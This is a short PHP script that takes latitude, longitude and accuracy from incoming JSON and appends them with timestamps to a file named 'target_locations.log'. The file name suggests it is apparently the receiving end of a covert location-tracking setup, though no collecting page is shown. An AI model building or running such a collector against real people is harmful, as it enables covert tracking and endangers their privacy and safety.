<?php
$data = json_decode(file_get_contents('php://input'), true);

if ($data) {
    $log = date('Y-m-d H:i:s') . " | Lat: " . ($data['lat'] ?? 'N/A') . 
           " | Lon: " . ($data['lon'] ?? 'N/A') . 
           " | Accuracy: " . ($data['accuracy'] ?? 'N/A') . "\n";

    file_put_contents('target_locations.log', $log, FILE_APPEND);
}

echo "OK";
?>